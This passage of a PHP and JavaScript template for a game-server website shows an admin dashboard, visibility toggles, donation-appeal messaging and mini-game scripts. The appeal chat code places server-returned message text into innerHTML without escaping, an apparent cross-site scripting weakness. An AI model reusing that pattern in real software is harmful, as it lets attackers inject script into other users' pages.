                                    <span class="text-warning"><i class="fas fa-coins"></i> Economy & Store</span>
                                    <i class="fas fa-chevron-down caret"></i>
                                </div>
                                 <div class="accordion-content">
                                    <ul class="legacy-links-list">
                                        <li><a href="javascript:void(0);" onclick="loadAdminAction('legacy_panel.php?action=addTPoint')"><i class="fas fa-plus-circle"></i> Grant <?php echo $tp_short; ?></a></li>
                                        <li><a href="javascript:void(0);" onclick="loadAdminAction('legacy_panel.php?action=massiveTPointsADD')"><i class="fas fa-users"></i> Massive <?php echo $tp_short; ?></a></li>
                                        <li><a href="javascript:void(0);" onclick="loadAdminAction('legacy_panel.php?action=Donators')"><i class="fas fa-star"></i> Top Supporters</a></li>
                                        <li><a href="javascript:void(0);" onclick="loadAdminAction('legacy_panel.php?action=gpholder')"><i class="fas fa-chart-line"></i> Economy Leaders</a></li>
                                    </ul>
                                </div>
                                <?php endif; ?>

                                <!-- 4. PAYMENTS & REVENUE -->
                                <?php if (IsAdministrator()): ?>
                                <div class="accordion-header" onclick="toggleAccordion(this)">
                                    <span class="text-success"><i class="fas fa-file-invoice-dollar"></i> Payments & Revenue</span>
                                    <i class="fas fa-chevron-down caret"></i>
                                </div>
                                <div class="accordion-content">
                                    <ul class="legacy-links-list">
                                        <li>
                                            <a href="javascript:void(0);" onclick="loadAdminAction('legacy_panel.php?action=manualDonations')">
                                                <i class="fas fa-hand-holding-usd"></i> Manual Donations
                                                <?php if ($pending_count > 0): ?>
                                                    <span class="badge" style="background: #ff4d4d; color: #fff; float: right; margin-top: 2px;"><?php echo $pending_count; ?></span>
                                                <?php endif; ?>
                                            </a>
                                        </li>
                                        <li><a href="javascript:void(0);" onclick="loadAdminAction('legacy_panel.php?action=paymentsRecived')"><i class="fas fa-receipt"></i> Payments Received</a></li>
                                        <li><a href="javascript:void(0);" onclick="loadAdminAction('legacy_panel.php?action=paypalSettings')"><i class="fab fa-paypal"></i> PayPal API Config</a></li>
                                        <li><a href="javascript:void(0);" onclick="loadAdminAction('legacy_panel.php?action=gcashSettings')"><i class="fas fa-wallet"></i> GCash Manual Config</a></li>
                                        <li><a href="javascript:void(0);" onclick="loadAdminAction('legacy_panel.php?action=paypalPackages')"><i class="fas fa-box"></i> PayPal Packages</a></li>
                                        <li><a href="javascript:void(0);" onclick="loadAdminAction('legacy_panel.php?action=gcashPackages')"><i class="fas fa-box"></i> GCash Packages</a></li>
                                    </ul>
                                </div>
                                <?php endif; ?>

                                <!-- 5. SUPPORT & INTERACTION -->
                                <div class="accordion-header" onclick="toggleAccordion(this)">
                                    <span><i class="fas fa-headset"></i> Support & Interaction</span>
                                    <i class="fas fa-chevron-down caret"></i>
                                </div>
                                <div class="accordion-content">
                                    <ul class="legacy-links-list">
                                        <li><a href="javascript:void(0);" onclick="loadAdminAction('legacy_panel.php?action=latestCases')"><i class="fas fa-clipboard-list"></i> Recent Support Tickets</a></li>
                                        <?php if (IsAdministrator()): ?>
                                        <li><a href="javascript:void(0);" onclick="loadAdminAction('legacy_panel.php?action=voters')"><i class="fas fa-vote-yea"></i> Most Voters List</a></li>
                                        <?php endif; ?>
                                    </ul>
                                </div>

                                <!-- 6. WEBSITE & SYSTEM -->
                                <div class="accordion-header" onclick="toggleAccordion(this)">
                                    <span class="text-info"><i class="fas fa-server"></i> Website & System</span>
                                    <i class="fas fa-chevron-down caret"></i>
                                </div>
                                <div class="accordion-content">
                                    <ul class="legacy-links-list">
                                        <li class="list-divider">Media & Community</li>
                                        <li><a href="javascript:void(0);" onclick="loadAdminAction('legacy_panel.php?action=manageNews')"><i class="fas fa-edit"></i> Manage News</a></li>
                                        <li><a href="javascript:void(0);" onclick="loadAdminAction('legacy_panel.php?action=addNews')"><i class="fas fa-plus-square"></i> Add New Post</a></li>
                                        <li><a href="javascript:void(0);" onclick="loadAdminAction('legacy_panel.php?action=addNewsMainImage')"><i class="fas fa-file-image" style="color: #38bdf8;"></i> Upload News Image</a></li>
                                        <li><a href="javascript:void(0);" onclick="loadAdminAction('legacy_panel.php?action=news')"><i class="fas fa-list-alt"></i> All News Posts</a></li>
                                        <li><a href="javascript:void(0);" onclick="loadAdminAction('legacy_panel.php?action=manageStreamers')"><i class="fas fa-video" style="color: #9b59b6;"></i> Manage Official Streamers</a></li>
                                        <li><a href="javascript:void(0);" onclick="loadAdminAction('legacy_panel.php?action=referralTracker')"><i class="fas fa-sitemap" style="color: #2ca4bf;"></i> Referral Inspector</a></li>
                                        <li><a href="javascript:void(0);" onclick="loadAdminAction('legacy_panel.php?action=downloadSettings')"><i class="fas fa-download"></i> Add Download Links</a></li>
                                        
                                        <?php if (IsAdministrator()): ?>
                                        <li><a href="javascript:void(0);" onclick="loadAdminAction('legacy_panel.php?action=addSliderImage')"><i class="fas fa-images"></i> Add Slider Image</a></li>
                                        <li><a href="javascript:void(0);" onclick="loadAdminAction('legacy_panel.php?action=post')"><i class="fas fa-camera"></i> Screenshots</a></li>
                                        
                                        <li class="list-divider">Staff & Core Settings</li>
                                        <li><a href="javascript:void(0);" onclick="loadAdminAction('legacy_panel.php?action=Staff')"><i class="fas fa-users-shield"></i> GM & Staff List</a></li>
                                        <li><a href="javascript:void(0);" onclick="loadAdminAction('legacy_panel.php?action=staffHidden')"><i class="fas fa-user-secret"></i> Hidden Staff</a></li>
                                        <li><a href="javascript:void(0);" onclick="loadAdminAction('legacy_panel.php?action=smtpSettings')"><i class="fas fa-envelope"></i> Email & SMTP</a></li>
                                        <li><a href="javascript:void(0);" onclick="loadAdminAction('legacy_panel.php?action=manageMinigames')"><i class="fas fa-gamepad"></i> Manage Mini Games</a></li>
                                        <li><a href="javascript:void(0);" onclick="loadAdminAction('legacy_panel.php?action=hideMenuItems')"><i class="fas fa-eye-slash"></i> Tab Visibility</a></li>
                                        <li><a href="javascript:void(0);" onclick="showLicenseRecheck()"><i class="fas fa-shield-alt text-warning"></i> License & Whitelist</a></li>
                                        <li><a href="javascript:void(0);" onclick="showSystemUpdates()"><i class="fas fa-cloud-download-alt text-success"></i> Website Updates</a></li>
                                        <li><a href="javascript:void(0);" onclick="loadAdminAction('legacy_panel.php?action=launcherUpdates')"><i class="fas fa-upload text-info"></i> Launcher Updates</a></li>
                                        <li><a href="javascript:void(0);" onclick="loadAdminAction('legacy_panel.php?action=uploadBaseFiles')"><i class="fas fa-database" style="color:#4ade80;"></i> Upload Base Files</a></li>
                                        <li><a href="javascript:void(0);" onclick="loadAdminAction('legacy_panel.php?action=convertIcons')"><i class="fas fa-images" style="color:#2ca4bf;"></i> Convert Icons (DDS→PNG)</a></li>
                                        <li><a href="javascript:void(0);" onclick="loadAdminAction('legacy_panel.php?action=settings')"><i class="fas fa-tools"></i> Global Website Settings</a></li>
                                        <?php endif; ?>
                                    </ul>
                                </div>
                                
                            </div>

                            <!-- Column 2: Main Content Frame -->
                            <div class="legacy-frame-container glass-panel" style="min-height: 400px; display: flex; flex-direction: column;">
                                <div id="adminDefaultView" style="text-align: center; padding: 50px; color: rgba(255,255,255,0.7); flex-grow: 1; display: flex; flex-direction: column; justify-content: center;">
                                    <i class="fas fa-tools fa-3x gradient-text" style="margin-bottom: 20px; opacity: 0.5;"></i>
                                    <h4 style="margin: 0; letter-spacing: 1px; font-weight: 700;">WELCOME! SELECT AN ACTION TO BEGIN.</h4>
                                    <p style="margin-top: 10px; font-size: 0.9rem; opacity: 0.6;">Select a tool from the left sidebar to manage your server.</p>
                                </div>

                                <!-- New GM Management Tool (Injected UI) -->
                                <div id="gmManagementTool" style="display:none; padding:30px; flex-grow:1;">
                                    <h3 class="gradient-text"><i class="fas fa-user-shield"></i> Manage GM & Permissions</h3>
                                    <p style="color:rgba(255,255,255,0.6); margin-bottom:25px;">Search for an account and update their privilege level (PV).</p>
                                    
                                    <div class="glass-card" style="background:rgba(0,0,0,0.2); padding:20px; margin-bottom:20px;">
                                        <div class="modern-form inline-form">
                                            <div class="form-group" style="flex:2;">
                                                <input type="text" id="gmSearchUser" placeholder="Enter username..." required>
                                                <label>Account Username</label>
                                            </div>
                                            <button type="button" class="btn-glow" onclick="handleGMManagement('search')"><i class="fas fa-search"></i> Search</button>
                                        </div>
                                    </div>

                                    <div id="gmUserResult" style="display:none;" class="glass-card">
                                        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:20px; border-bottom:1px solid rgba(255,255,255,0.1); padding-bottom:15px;">
                                            <div>
                                                <h4 id="resUserName" style="margin:0; font-size:1.2rem;">Username</h4>
                                                <small id="resUserEmail" style="color:#2ca4bf;">email@example.com</small>
                                            </div>
                                            <div class="status-badge" id="resUserPv" style="background:rgba(44, 164, 191, 0.2); color:#2ca4bf; border:1px solid rgba(44, 164, 191, 0.3);">PV: 0</div>
                                        </div>

                                        <div class="modern-form">
                                            <div class="form-group">
                                                <select id="newPvLevel" style="width:100%; background:rgba(0,0,0,0.3); color:#fff; border:1px solid rgba(255,255,255,0.1); padding:10px; border-radius:8px;">
                                                    <option value="0">Level 0: Normal Player</option>
                                                    <option value="1">Level 1: Donator / VIP</option>
                                                    <option value="2">Level 2: Moderator</option>
                                                    <option value="5">Level 5: Game Master (Low)</option>
                                                    <option value="8">Level 8: Game Master (High)</option>
                                                    <option value="9">Level 9: Administrator</option>
                                                </select>
                                                <label style="top:-20px; font-size:0.8rem; opacity:0.7;">New Privilege Level</label>
                                            </div>

                                            <div class="form-group" style="margin-top:20px;">
                                                <input type="password" id="admin2faCode" placeholder="Enter YOUR 6-digit code" required>
                                                <label>Admin 2FA Verification (Required)</label>
                                                <small style="color:#e74c3c; display:block; margin-top:5px;"><i class="fas fa-info-circle"></i> You must provide your own 2FA code to authorize this change.</small>
                                            </div>

                                            <button type="button" class="btn-glow red-glow" style="width:100%; margin-top:20px;" onclick="handleGMManagement('update')">
                                                <i class="fas fa-user-check"></i> UPDATE PERMISSIONS
                                            </button>
                                        </div>
                                    </div>
                                </div>

                                 <!-- Website Update Tool -->
                                <div id="systemUpdatesTool" style="display:none; padding:30px; flex-grow:1; overflow-y:auto; max-height:100%;">
                                    <h3 class="gradient-text"><i class="fas fa-cloud-download-alt"></i> Website Updates</h3>
                                    <p style="color:rgba(255,255,255,0.6); margin-bottom:25px;">Manage your system version and fetch latest updates from GitHub.</p>
                                    
                                    <div class="stat-grid" style="display: grid; grid-template-columns: 1fr 1fr; gap:20px; margin-bottom:30px;">
                                        <div class="glass-card" style="text-align:center; padding:20px;">
                                            <small style="opacity:0.6; display:block; margin-bottom:5px;">Current Version</small>
                                            <h2 id="currentVerText" style="margin:0; color:#fff;">v<?php 
                                               $vData = json_decode(@file_get_contents(__DIR__ . '/version.json'), true);
                                               echo $vData['version'] ?? 'Unknown';
                                            ?></h2>
                                        </div>
                                        <div class="glass-card" style="text-align:center; padding:20px;">
                                            <small style="opacity:0.6; display:block; margin-bottom:5px;">Latest Available</small>
                                            <h2 id="latestVerText" style="margin:0; color:#2ca4bf;">Checking...</h2>
                                        </div>
                                    </div>

                                    <div id="updateStatusBox" class="glass-card" style="background:rgba(0,0,0,0.2); padding:30px; text-align:center;">
                                        <div id="updateLoading">
                                            <i class="fas fa-sync-alt fa-3x fa-spin" style="margin-bottom:20px; opacity:0.3;"></i>
                                            <p>Communicating with GitHub...</p>
                                        </div>

                                        <div id="updateReady" style="display:none;">
                                            <i class="fas fa-check-circle fa-4x text-success" style="margin-bottom:20px;"></i>
                                            <h4 id="updateMessage">Your website is up to date!</h4>
                                            <div style="display:flex; justify-content:center; gap:15px; margin-top:20px;">
                                                <button type="button" class="btn-glow" onclick="checkSystemUpdates(true)">
                                                    <i class="fas fa-search"></i> Check Again
                                                </button>
                                            </div>
                                        </div>

                                        <div id="updateFound" style="display:none;">
                                            <i class="fas fa-arrow-alt-circle-down fa-4x text-info" style="margin-bottom:20px; animation: bounce 2s infinite;"></i>
                                            <h4 id="newVerFoundText" class="text-info">New Version Found: v1.2.3</h4>
                                            <p style="margin-top:10px; opacity:0.8;">Updates include new security patches and features.</p>
                                            
                                            <div style="display:flex; justify-content:center; gap:15px; margin-top:20px;">
                                                <button id="mainUpdateBtn" class="btn-glow" style="background:#2ecc71!important;" onclick="doSystemUpdate()">
                                                    <i class="fas fa-download"></i> UPDATE NOW
                                                </button>
                                            </div>
                                        </div>

                                        <div id="updateError" style="display:none; color:#f87171; padding:20px; background:rgba(248,113,113,0.1); border-radius:10px; border:1px solid rgba(248,113,113,0.3); text-align:left;">
                                            <div style="font-size:1rem; font-weight:700; margin-bottom:12px;"><i class="fas fa-exclamation-triangle"></i> Update Status</div>
                                            <div id="updateErrorMsg" style="white-space:pre-wrap; font-size:0.85rem;"></div>
                                            <br><button type="button" onclick="checkSystemUpdates(true)" class="btn-glow" style="font-size:0.8rem; padding:8px 20px;"><i class="fas fa-redo"></i> Check Again</button>
                                        </div>
                                    </div>
                                </div>

                                <!-- License & Whitelist Recheck Tool -->
                                <div id="licenseRecheckTool" style="display:none; padding:30px; flex-grow:1; overflow-y:auto; max-height:100%;">
                                    <h3 class="gradient-text"><i class="fas fa-shield-alt"></i> Website License Verification</h3>
                                    <p style="color:rgba(255,255,255,0.6); margin-bottom:25px;">Verify your active website domain license and force sync authorization directly from the master server.</p>
                                    
                                    <div class="glass-card" style="background:rgba(0,0,0,0.25); padding:25px; margin-bottom:25px; border-radius:14px; border:1px solid rgba(255,255,255,0.08);">
                                        <div style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:15px;">
                                            <div>
                                                <h4 style="margin:0; font-size:1.1rem; color:#fff;">Force Sync License</h4>
                                                <p style="margin:5px 0 0 0; font-size:0.85rem; opacity:0.7;">Bypasses local cache and re-validates this domain's license live.</p>
                                            </div>
                                            <button id="recheckLicenseBtn" class="btn-glow" style="background:linear-gradient(135deg, #2ecc71, #27ae60)!important; border:none; padding:12px 25px; font-weight:bold; font-size:0.95rem; box-shadow: 0 4px 15px rgba(46,204,113,0.3);" onclick="forceRecheckLicense(true)">
                                                <i class="fas fa-sync-alt"></i> FORCE RECHECK NOW
                                            </button>
                                        </div>
                                    </div>

                                    <div id="licenseRecheckResultBox" class="glass-card" style="background:rgba(0,0,0,0.2); padding:20px; border-radius:12px;">
                                        <h4 style="margin:0 0 15px 0; color:#2ca4bf;"><i class="fas fa-certificate"></i> Active Domain License</h4>
                                        <div id="whitelistedDomainsList">
                                            <p style="font-size:0.9rem; opacity:0.6;"><i class="fas fa-info-circle"></i> Loading domain license status...</p>
                                        </div>
                                    </div>
                                </div>

                                <iframe id="adminFrame" src="about:blank" class="embedded-legacy" style="display: none; border: none; width: 100%; height: 100%; flex-grow: 1;" onload="try { if (this.src && this.src !== 'about:blank' && !this.src.endsWith('about:blank')) { this.style.display='block'; var d=document.getElementById('adminDefaultView'); if(d) d.style.display='none'; var g=document.getElementById('gmManagementTool'); if(g) g.style.display='none'; var s=document.getElementById('systemUpdatesTool'); if(s) s.style.display='none'; var l=document.getElementById('licenseRecheckTool'); if(l) l.style.display='none'; } } catch(e){ this.style.display='block'; }"></iframe>
                            </div>

                            <!-- Column 3: Quick Settings -->
                            <div class="legacy-vis-column glass-panel scrollable" style="padding: 20px;">
                                <div class="visibility-settings-card" style="margin-top: 0; padding: 0; background: transparent; border: none; box-shadow: none;">
                                    <h4 class="settings-title"><i class="fas fa-eye"></i> Visibility Control</h4>
                                    <p class="settings-desc">Enable or disable dashboard modules in real-time.</p>
                                    
                                    <style>
                                    .vis-section-label { font-size:0.65rem; text-transform:uppercase; letter-spacing:2px; color:#fcc419; font-weight:800; margin: 18px 0 10px; display:flex; align-items:center; gap:8px; }
                                    .vis-section-label::after { content:''; flex:1; height:1px; background:rgba(252,196,25,0.15); }
                                    .vis-toggle-row { display:flex; align-items:center; justify-content:space-between; background:rgba(0,0,0,0.25); border:1px solid rgba(255,255,255,0.06); border-radius:10px; padding:10px 14px; margin-bottom:8px; cursor:pointer; transition:0.2s; }
                                    .vis-toggle-row:hover { border-color:rgba(252,196,25,0.25); background:rgba(252,196,25,0.04); }
                                    .vis-toggle-label { display:flex; align-items:center; gap:10px; font-size:0.82rem; color:rgba(255,255,255,0.8); }
                                    .vis-toggle-label i { width:16px; text-align:center; color:#fcc419; font-size:0.75rem; }
                                    .vis-switch { position:relative; width:36px; height:20px; flex-shrink:0; }
                                    .vis-switch input { opacity:0; width:0; height:0; position:absolute; }
                                    .vis-slider { position:absolute; inset:0; background:rgba(255,255,255,0.1); border-radius:20px; transition:0.3s; cursor:pointer; }
                                    .vis-slider::before { content:''; position:absolute; width:14px; height:14px; left:3px; top:3px; background:#aaa; border-radius:50%; transition:0.3s; }
                                    .vis-switch input:checked + .vis-slider { background:rgba(252,196,25,0.3); border:1px solid rgba(252,196,25,0.6); }
                                    .vis-switch input:checked + .vis-slider::before { transform:translateX(16px); background:#fcc419; box-shadow:0 0 6px rgba(252,196,25,0.8); }
                                    #visSaveStatus { display:none; font-size:0.78rem; color:#4ade80; padding:8px 12px; background:rgba(74,222,128,0.1); border-radius:8px; border:1px solid rgba(74,222,128,0.3); text-align:center; margin-top:10px; }
                                    </style>

                                    <form id="visibilityForm">

                                    <div class="vis-section-label"><i class="fas fa-th-large"></i> Main Tabs</div>

                                    <?php
                                    $mainTabs = [
                                        ['key'=>'menu_security_visible',  'icon'=>'fa-shield-alt', 'label'=>'Security Tab',          'default'=>'1'],
                                        ['key'=>'menu_donations_visible', 'icon'=>'fa-history',    'label'=>'Donation Tracking',     'default'=>'1'],
                                        ['key'=>'menu_characters_visible','icon'=>'fa-users',      'label'=>'Characters Tab',        'default'=>'1'],
                                        ['key'=>'menu_rewards_visible',   'icon'=>'fa-gift',       'label'=>'Rewards Tab',           'default'=>'0'],
                                        ['key'=>'menu_advanced_visible',  'icon'=>'fa-cogs',       'label'=>'Advanced Actions Tab',  'default'=>'1'],
                                    ];
                                    foreach ($mainTabs as $t):
                                        $val = GetWebsiteOption($t['key']);
                                        $chk = ($val === '' ? $t['default'] : $val) !== '0' ? 'checked' : '';
                                    ?>
                                    <div class="vis-toggle-row" onclick="this.querySelector('input').click()">
                                        <div class="vis-toggle-label"><i class="fas <?php echo $t['icon']; ?>"></i><?php echo $t['label']; ?></div>
                                        <label class="vis-switch" onclick="event.stopPropagation()">
                                            <input type="checkbox" <?php echo $chk; ?> onchange="saveVisibilityOption('<?php echo $t['key']; ?>', this.checked)">
                                            <span class="vis-slider"></span>
                                        </label>
                                    </div>
                                    <?php endforeach; ?>

                                    <div class="vis-section-label"><i class="fas fa-tools"></i> Service Desk</div>

                                    <?php
                                    $advTabs = [
                                        ['key'=>'adv_password_visible', 'icon'=>'fa-key',          'label'=>'Change Password',     'default'=>'0'],
                                        ['key'=>'adv_email_visible',    'icon'=>'fa-envelope',     'label'=>'Change Email',        'default'=>'1'],
                                        ['key'=>'adv_nick_visible',     'icon'=>'fa-id-card',      'label'=>'Change Nick',         'default'=>'0'],
                                        ['key'=>'adv_tickets_visible',  'icon'=>'fa-ticket-alt',   'label'=>'Support Tickets',     'default'=>'1'],
                                        ['key'=>'adv_feedback_visible', 'icon'=>'fa-lightbulb',    'label'=>'Submit Feedback',     'default'=>'0'],
                                        ['key'=>'adv_referral_visible', 'icon'=>'fa-user-friends', 'label'=>'Referral System',     'default'=>'0'],
                                        ['key'=>'adv_redeem_visible',   'icon'=>'fa-gift',         'label'=>'Redeem Gift',         'default'=>'0'],
                                        ['key'=>'adv_vip_visible',      'icon'=>'fa-star',         'label'=>'VIP System & Panel',  'default'=>'0'],
                                    ];
                                    foreach ($advTabs as $t):
                                        $val = GetWebsiteOption($t['key']);
                                        $chk = ($val === '' ? $t['default'] : $val) !== '0' ? 'checked' : '';
                                    ?>
                                    <div class="vis-toggle-row" onclick="this.querySelector('input').click()">
                                        <div class="vis-toggle-label"><i class="fas <?php echo $t['icon']; ?>"></i><?php echo $t['label']; ?></div>
                                        <label class="vis-switch" onclick="event.stopPropagation()">
                                            <input type="checkbox" <?php echo $chk; ?> onchange="saveVisibilityOption('<?php echo $t['key']; ?>', this.checked)">
                                            <span class="vis-slider"></span>
                                        </label>
                                    </div>
                                    <?php endforeach; ?>

                                    <div id="visSaveStatus"><i class="fas fa-check-circle"></i> Saved!</div>

                                    </form>
                                </div><!-- end visibility-settings-card -->
                            </div><!-- end column 3 -->
                        </div><!-- end admin-triple-grid -->
                    </div><!-- end AdminPanel -->
                    <?php endif; ?>

                    <!-- Advanced Actions Tab (Legacy Panel Wrapper) -->
                    <div id="Advanced" class="tabcontent" style="display: none; height: 100%;">
                        <div class="legacy-integration-grid">
                            <div class="legacy-nav-column glass-panel scrollable">
                                <h4 class="category-title"><i class="fas fa-user-circle"></i> Service Desk</h4>
                                <ul class="legacy-links-list">
                                    
                                    <?php if (GetWebsiteOption('adv_email_visible') != '0' || IsAdministrator()): ?>
                                    <li><a href="javascript:void(0);" onclick="document.getElementById('legacyFrame').src='legacy_panel.php?action=changeEmail'"><i class="fas fa-envelope"></i> Change Email</a></li>
                                    <?php endif; ?>
                                    

                                    <?php if (GetWebsiteOption('adv_tickets_visible') != '0' || IsAdministrator()): ?>
                                    <li><a href="javascript:void(0);" onclick="document.getElementById('legacyFrame').src='legacy_panel.php?action=createCase'"><i class="fas fa-ticket-alt"></i> Support Case</a></li>
                                    <li><a href="javascript:void(0);" onclick="document.getElementById('legacyFrame').src='legacy_panel.php?action=checkCases'"><i class="fas fa-list-ul"></i> View My Cases</a></li>
                                    <?php endif; ?>
                                    
                                    

                                    <?php if (GetWebsiteOption('adv_redeem_visible') != '0' || IsAdministrator()): ?>
                                    <li><a href="javascript:void(0);" onclick="document.getElementById('legacyFrame').src='legacy_panel.php?action=addcode'"><i class="fas fa-gift"></i> Redeem Gift</a></li>
                                    <?php endif; ?>
                                    

                                </ul>
                            </div>
                            <div class="legacy-frame-container glass-panel">
                                <iframe id="legacyFrame" src="legacy_panel.php" class="embedded-legacy"></iframe>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <?php endif; ?>
    </div>
</div>

<script>
function toggleAccordion(element) {
    console.log('[Accordion] Toggling element:', element);
    element.classList.toggle("active");
    
    // Find the next .accordion-content sibling
    var content = element.nextElementSibling;
    while (content && !content.classList.contains('accordion-content')) {
        content = content.nextElementSibling;
    }

    if (content) {
        if (content.classList.contains("expanded")) {
            content.classList.remove("expanded");
            content.style.maxHeight = null;
        } else {
            content.classList.add("expanded");
            content.style.maxHeight = content.scrollHeight + "px";
        }
    } else {
        console.warn('[Accordion] Content element not found for:', element);
    }
}

// Load a URL into the admin iframe and show it
function loadAdminAction(url) {
    var frame = document.getElementById('adminFrame');
    if (!frame) { console.error('[loadAdminAction] adminFrame not found'); return; }
    
    // Hide default placeholders
    var defaultView = document.getElementById('adminDefaultView');
    if (defaultView) defaultView.style.display = 'none';
    var gmTool = document.getElementById('gmManagementTool');
    if (gmTool) gmTool.style.display = 'none';
    var sysTool = document.getElementById('systemUpdatesTool');
    if (sysTool) sysTool.style.display = 'none';

    frame.style.display = 'block';
    frame.src = url;
}

// Save a single visibility option instantly via AJAX
function saveVisibilityOption(key, checked) {
    var val = checked ? '1' : '0';
    var body = encodeURIComponent(key) + '=' + encodeURIComponent(val);
    
    fetch('legacy_panel.php?action=settings&method=update_visibility', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: body
    })
    .then(function(r) { return r.json(); })
    .then(function(data) {
        var status = document.getElementById('visSaveStatus');
        if (status) {
            status.style.display = 'block';
            status.style.color = data.status === 'success' ? '#4ade80' : '#f87171';
            status.innerHTML = data.status === 'success'
                ? '<i class="fas fa-check-circle"></i> Saved!'
                : '<i class="fas fa-exclamation-circle"></i> ' + (data.message || 'Error saving');
            setTimeout(function() { status.style.display = 'none'; }, 2500);
        }
    })
    .catch(function(e) {
        console.error('[saveVisibilityOption] Error:', e);
    });
}


// Donation Receipt Lightbox
function viewDonationProof(src) {
    document.getElementById('receiptImg').src = src;
    document.getElementById('receiptModal').style.display = 'flex';
}

// Donation Appeal System
let currentAppealId = null;

function openAppealModal(donationId, txId) {
    currentAppealId = donationId;
    document.getElementById('appealTxId').innerText = txId;
    document.getElementById('appealModal').style.display = 'flex';
    loadAppealMessages();
}

function loadAppealMessages() {
    const container = document.getElementById('appealMessages');
    container.innerHTML = '<div class="text-center"><i class="fas fa-spinner fa-spin"></i> Loading...</div>';
    
    fetch('Actions/donation-messages.php?action=get&donation_id=' + currentAppealId)
    .then(r => r.json())
    .then(data => {
        container.innerHTML = '';
        if (data.status === 'success' && data.messages.length > 0) {
            data.messages.forEach(msg => {
                const align = (msg.is_admin === "1" || msg.is_admin === 1) ? 'left' : 'right';
                const sender = (msg.is_admin === "1" || msg.is_admin === 1) ? 'Administrator' : 'You';
                const glassClass = (msg.is_admin === "1" || msg.is_admin === 1) ? 'admin-msg' : 'player-msg';
                
                container.innerHTML += `
                    <div class="msg-row float-${align}">
                        <div class="msg-bubble ${glassClass}">
                            <small class="msg-meta">${sender} • ${msg.created_at}</small>
                            <p>${msg.message}</p>
                        </div>
                    </div>
                `;
            });
            container.scrollTop = container.scrollHeight;
        } else {
            container.innerHTML = '<div class="text-center text-muted"><i class="fas fa-info-circle"></i> No messages yet. Send a message to start the appeal.</div>';
        }
    });
}

function sendAppealMessage() {
    const input = document.getElementById('appealInput');
    const msg = input.value.trim();
    if (!msg) return;

    input.disabled = true;
    fetch('Actions/donation-messages.php?action=send', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'donation_id=' + currentAppealId + '&message=' + encodeURIComponent(msg)
    })
    .then(r => r.json())
    .then(data => {
        input.disabled = false;
        if (data.status === 'success') {
            input.value = '';
            loadAppealMessages();
        } else {
            alert(data.message);
        }
    });
}

// --- Mini Game Arcade Logic ---
let activeGame = null;
let wheelSettings = [];
let isSpinning = false;
let currentRotation = 0;

function syncBalance(newBalance) {
    const sidebar = document.getElementById('userPointsSidebar');
    const sidebarMobile = document.getElementById('userPointsSidebarMobile');
    const overview = document.getElementById('userPointsOverview');
    const game = document.getElementById('userPointsGame');
    if (sidebar) sidebar.innerText = newBalance;
    if (sidebarMobile) sidebarMobile.innerText = newBalance;
    if (overview) overview.innerText = newBalance;
    if (game) game.innerText = newBalance;
}

// Robust fetch wrapper for arcade actions
async function arcadeFetch(action, params = {}) {
    const postData = new URLSearchParams();
    postData.append('action', action);
    for (const [key, value] of Object.entries(params)) {
        postData.append(key, value);
    }

    try {
        const response = await fetch('Actions/minigame-play.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: postData
        });

        const text = await response.text();
        console.log(`[Arcade] Response for ${action}:`, text.substring(0, 100));

        try {
            const data = JSON.parse(text);
            return data;
        } catch (e) {
            console.error(`[Arcade] JSON Parse Error for ${action}:`, e, text);
            return { status: 'error', message: 'Failed to parse server response.' };
        }
    } catch (e) {
        console.error(`[Arcade] Fetch Error for ${action}:`, e);
        return { status: 'error', message: 'Connection to server failed.' };
    }
}

function showGame(gameType) {
    console.log(`[Arcade] Showing game: ${gameType}`);
    document.getElementById('gameViewContainer').style.display = 'block';
    const area = document.getElementById('activeGameArea');
    
    // Header for game with live balance
    const currentPoints = document.getElementById('userPointsSidebar').innerText;
    area.innerHTML = `
        <div class="game-header-sync" style="background: rgba(44, 164, 191, 0.1); padding: 10px; border-radius: 10px; margin-bottom: 20px; display: flex; justify-content: space-between; align-items: center;">
            <span style="opacity:0.8; font-size:0.9rem;"><i class="fas fa-wallet"></i> Current Balance</span>
            <strong style="color:#2ca4bf;"><span id="userPointsGame">${currentPoints}</span> <?php echo $tp_short; ?></strong>
        </div>
        <div class="loader">Loading Game...</div>
    `;
    
    activeGame = gameType;
    loadWinners();

    if (gameType === 'wheel') {
        renderWheelUI();
        loadWheelSettings();
    } else if (gameType === 'dice') {
        renderDiceUI();
    } else if (gameType === 'lottery') {
        renderLotteryUI();
    }
}

function showLobby() {
    document.getElementById('gameViewContainer').style.display = 'none';
    document.getElementById('minigameLobby').style.display = 'block';
}
 function renderWheelUI() {
    document.getElementById('activeGameArea').innerHTML = `
        <h3><i class="fas fa-sync-alt"></i> Spin the Wheel</h3>
        <p style="color:#aaa;">Try your luck and win ${tp_name} instantly!</p>
        <div id="wheelContainer" style="position:relative; width:300px; height:300px; margin: 20px auto;">
            <div id="wheelPointer" style="position:absolute; top:-15px; left:140px; width:0; height:0; border-left:10px solid transparent; border-right:10px solid transparent; border-top:20px solid #fff; z-index:10; filter: drop-shadow(0px 4px 2px rgba(0,0,0,0.5));"></div>
            <canvas id="wheelCanvas" width="300" height="300" style="border-radius:50%; box-shadow: 0 0 20px rgba(0,0,0,0.5); border: 4px solid rgba(255,255,255,0.1); transition: transform 4s cubic-bezier(0.1, 0, 0, 1);"></canvas>
        </div>
        <button id="spinBtn" class="btn-glow" style="background:#e67e22!important; font-size:18px; padding:15px 30px!important; margin-top:20px;" onclick="spinWheel()">
            <i class="fas fa-play"></i> SPIN (<span id="spinCost"><i class="fas fa-spinner fa-spin"></i></span> ${tp_short})
        </button>
        <div id="spinResult" style="margin-top:20px; font-weight:bold; font-size:1.2rem;"></div>
    `;
}


function renderDiceUI() {
    document.getElementById('activeGameArea').innerHTML = `
        <h3><i class="fas fa-dice-six"></i> Dice Master</h3>
        <p style="color:#aaa;">Roll the dice. Choose High (4-6) or Low (1-3).</p>
        <div class="dice-container">
            <div id="diceObj" class="dice"><i class="fas fa-question"></i></div>
        </div>
        <div style="margin-bottom:20px;">
            <label>Bet Amount</label><br>
            <input type="number" id="diceBet" value="100" min="10" style="width:100px; text-align:center;">
        </div>
        <div style="display:flex; justify-content:center; gap:20px;">
            <button class="btn-glow" onclick="playDice('low')" style="background:#2ca4bf!important; flex:1;">LOW (1-3)</button>
